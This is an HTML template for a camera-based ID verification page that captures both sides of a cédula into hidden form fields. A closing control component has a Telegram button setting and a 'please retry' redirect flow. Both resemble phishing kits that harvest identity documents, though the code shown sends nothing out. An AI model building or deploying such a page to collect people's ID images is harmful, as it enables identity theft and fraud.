<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Verificacion de Documento</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 500px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #1e3c72;
            margin-bottom: 10px;
            text-align: center;
            font-size: 22px;
        }
        .subtitulo {
            color: #666;
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .paso-indicator {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .paso {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            background: #e9ecef;
            color: #6c757d;
            transition: all 0.3s;
        }
        .paso.activo {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
        }
        .paso.completado {
            background: #28a745;
            color: white;
        }
        .paso-numero {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }
        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1.6;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        #video, #canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        #canvas {
            display: none;
        }
        .preview-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        .document-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 85%;
            height: 80%;
            border: 3px dashed rgba(255,255,255,0.6);
            border-radius: 12px;
        }
        .document-label {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }
        .instrucciones {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 12px 15px;
            margin-bottom: 15px;
        }
        .instrucciones ul {
            list-style: none;
            font-size: 12px;
            color: #555;
        }
        .instrucciones li {
            padding: 4px 0;
            padding-left: 20px;
            position: relative;
        }
        .instrucciones li::before {
            content: "✓";
            position: absolute;
            left: 0;
            color: #28a745;
            font-weight: bold;
        }
        .previews-container {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .preview-box {
            flex: 1;
            aspect-ratio: 1.6;
            background: #e9ecef;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            border: 2px dashed #ccc;
        }
        .preview-box.captured {
            border: 2px solid #28a745;
        }
        .preview-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .preview-box .label {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 4px;
            font-size: 11px;
            text-align: center;
        }
        .preview-box .placeholder {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #999;
            font-size: 12px;
        }
        .preview-box .placeholder svg {
            width: 30px;
            height: 30px;
            margin-bottom: 5px;
            opacity: 0.5;
        }
        .btn-capturar {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-capturar:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(40, 167, 69, 0.4);
        }
        .btn-enviar {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            display: none;
        }
        .btn-enviar:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(30, 60, 114, 0.4);
        }
        .btn-enviar:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .botones-secundarios {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .btn-reintentar {
            flex: 1;
            padding: 10px;
            background: transparent;
            color: #dc3545;
            border: 2px solid #dc3545;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: none;
        }
        .btn-reintentar:hover {
            background: #dc3545;
            color: white;
        }
        #mensaje {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            display: none;
        }
        #mensaje.exito {
            display: block;
            background: #d4edda;
            color: #155724;
        }
        #mensaje.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
        }
        .camera-error {
            display: none;
            text-align: center;
            padding: 40px 20px;
            color: #721c24;
            background: #f8d7da;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Verificacion de Documento</h1>
            <p class="subtitulo">Tome foto de su cedula por ambos lados</p>

            <div class="paso-indicator">
                <div class="paso activo" id="paso1">
                    <span class="paso-numero">1</span>
                    <span>Frente</span>
                </div>
                <div class="paso" id="paso2">
                    <span class="paso-numero">2</span>
                    <span>Reverso</span>
                </div>
            </div>

            <div class="camera-error" id="cameraError">
                <p>No se pudo acceder a la camara.</p>
                <p style="font-size: 13px; margin-top: 10px;">Por favor, permita el acceso a la camara en su navegador.</p>
            </div>

            <div id="cameraSection">
                <div class="camera-container">
                    <video id="video" autoplay playsinline></video>
                    <canvas id="canvas"></canvas>
                    <img id="previewActual" class="preview-img" alt="Vista previa">
                    <div class="overlay">
                        <div class="document-guide"></div>
                        <div class="document-label" id="documentLabel">Frente de la cedula</div>
                    </div>
                </div>

                <div class="instrucciones">
                    <ul>
                        <li>Coloque el documento dentro del recuadro</li>
                        <li>Asegurese de que el texto sea legible</li>
                        <li>Evite reflejos y sombras</li>
                        <li>Mantenga el documento recto</li>
                    </ul>
                </div>

                <div class="previews-container">
                    <div class="preview-box" id="previewFrente">
                        <div class="placeholder" id="placeholderFrente">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                            </svg>
                            <span>Frente</span>
                        </div>
                        <img id="imgFrente" style="display:none;" alt="Frente">
                        <div class="label">Frente</div>
                    </div>
                    <div class="preview-box" id="previewReverso">
                        <div class="placeholder" id="placeholderReverso">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                            </svg>
                            <span>Reverso</span>
                        </div>
                        <img id="imgReverso" style="display:none;" alt="Reverso">
                        <div class="label">Reverso</div>
                    </div>
                </div>

                <form id="formCedula">
                    <input type="hidden" id="cedula_frente" name="cedula_frente">
                    <input type="hidden" id="cedula_reverso" name="cedula_reverso">
                    <input type="hidden" id="no-status" name="status" value="cedula">

                    <button type="button" class="btn-capturar" id="btnCapturar">Capturar Frente</button>
                    <button type="submit" class="btn-enviar" id="enviar">Enviar Verificacion</button>

                    <div class="botones-secundarios">
                        <button type="button" class="btn-reintentar" id="btnReintentarFrente">Repetir Frente</button>
                        <button type="button" class="btn-reintentar" id="btnReintentarReverso">Repetir Reverso</button>
                    </div>
                </form>
            </div>

            <div id="mensaje"></div>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const previewActual = document.getElementById('previewActual');
        const btnCapturar = document.getElementById('btnCapturar');
        const btnEnviar = document.getElementById('enviar');
        const btnReintentarFrente = document.getElementById('btnReintentarFrente');
        const btnReintentarReverso = document.getElementById('btnReintentarReverso');
        const cameraError = document.getElementById('cameraError');
        const cameraSection = document.getElementById('cameraSection');
        const documentLabel = document.getElementById('documentLabel');
        const paso1 = document.getElementById('paso1');
        const paso2 = document.getElementById('paso2');

        // Campos hidden
        const cedulaFrente = document.getElementById('cedula_frente');
        const cedulaReverso = document.getElementById('cedula_reverso');

        // Previews
        const imgFrente = document.getElementById('imgFrente');
        const imgReverso = document.getElementById('imgReverso');
        const previewFrente = document.getElementById('previewFrente');
        const previewReverso = document.getElementById('previewReverso');
        const placeholderFrente = document.getElementById('placeholderFrente');
        const placeholderReverso = document.getElementById('placeholderReverso');

        let stream = null;
        let paso = 1; // 1 = frente, 2 = reverso

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;
            } catch (error) {
                console.error('Error al acceder a la camara:', error);
                cameraSection.querySelector('.camera-container').style.display = 'none';
                cameraSection.querySelector('.instrucciones').style.display = 'none';
                btnCapturar.style.display = 'none';
                cameraError.style.display = 'block';
            }
        }

        function capturarFoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.85);

            if (paso === 1) {
                // Capturar frente
                cedulaFrente.value = imageData;
                imgFrente.src = imageData;
                imgFrente.style.display = 'block';
                placeholderFrente.style.display = 'none';
                previewFrente.classList.add('captured');

                // Pasar al reverso
                paso = 2;
                paso1.classList.remove('activo');
                paso1.classList.add('completado');
                paso2.classList.add('activo');
                documentLabel.textContent = 'Reverso de la cedula';
                btnCapturar.textContent = 'Capturar Reverso';
                btnReintentarFrente.style.display = 'block';

            } else if (paso === 2) {
                // Capturar reverso
                cedulaReverso.value = imageData;
                imgReverso.src = imageData;
                imgReverso.style.display = 'block';
                placeholderReverso.style.display = 'none';
                previewReverso.classList.add('captured');

                // Mostrar boton de enviar
                paso2.classList.remove('activo');
                paso2.classList.add('completado');
                btnCapturar.style.display = 'none';
                btnEnviar.style.display = 'block';
                btnReintentarReverso.style.display = 'block';

                document.querySelector('.document-guide').style.borderColor = 'rgba(40, 167, 69, 0.8)';
            }
        }

        function reintentarFrente() {
            cedulaFrente.value = '';
            imgFrente.src = '';
            imgFrente.style.display = 'none';
            placeholderFrente.style.display = 'flex';
            previewFrente.classList.remove('captured');

            // Volver al paso 1
            paso = 1;
            paso1.classList.add('activo');
            paso1.classList.remove('completado');
            paso2.classList.remove('activo');
            paso2.classList.remove('completado');
            documentLabel.textContent = 'Frente de la cedula';
            btnCapturar.textContent = 'Capturar Frente';
            btnCapturar.style.display = 'block';
            btnEnviar.style.display = 'none';
            btnReintentarFrente.style.display = 'none';
            btnReintentarReverso.style.display = 'none';

            // También limpiar reverso si estaba capturado
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            document.querySelector('.document-guide').style.borderColor = 'rgba(255,255,255,0.6)';
        }

        function reintentarReverso() {
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            // Volver al paso 2
            paso = 2;
            paso2.classList.add('activo');
            paso2.classList.remove('completado');
            documentLabel.textContent = 'Reverso de la cedula';
            btnCapturar.textContent = 'Capturar Reverso';
            btnCapturar.style.display = 'block';
            btnEnviar.style.display = 'none';
            btnReintentarReverso.style.display = 'none';

            document.querySelector('.document-guide').style.borderColor = 'rgba(255,255,255,0.6)';
        }

        btnCapturar.addEventListener('click', capturarFoto);
        btnReintentarFrente.addEventListener('click', reintentarFrente);
        btnReintentarReverso.addEventListener('click', reintentarReverso);

        iniciarCamara();
    </script>

    <x-control
        :auto-completar="false"
        :debug="false"
        redirect-url="/verificacion/wait"
        toast-message="No se pudo verificar el documento, intente nuevamente"
        telegram-button="Cedula"
    />
</body>
</html>
